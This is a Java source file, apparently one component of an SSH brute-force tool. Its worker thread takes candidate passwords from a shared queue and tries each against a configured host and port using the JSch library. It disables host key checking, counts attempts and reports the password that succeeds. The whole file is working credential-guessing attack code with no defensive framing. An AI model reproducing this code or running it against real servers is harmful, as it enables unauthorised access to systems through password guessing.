package solirsayple.sshbrutewj;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class SSHThread implements Runnable{
    private JSch jsch = new JSch();

    public void attemptConnection(String password) throws JSchException {
        Session session = jsch.getSession(ProgramSettings.username, ProgramSettings.ip, ProgramSettings.port);
        session.setTimeout(ProgramSettings.timeout);
        session.setPassword(password);
        session.connect();
    }

    public synchronized void run() {
        jsch.setConfig("StrictHostKeyChecking", "no");

        while (!ProgramSettings.queue.isEmpty()) {
            try{
                String password = ProgramSettings.queue.take();
                try {
                    if (ProgramSettings.verboseMode == true){
                        System.out.println(password);
                    }
                    
                    Statistics.attemptsCount += 1;

                    attemptConnection(password);
                    Main.lockAllThreads();
                    Main.onPasswordCorrect(password);
                } catch (JSchException e) {
                    continue;
                } 
            } catch (InterruptedException e){
                continue;
            }
            

        }
    }

}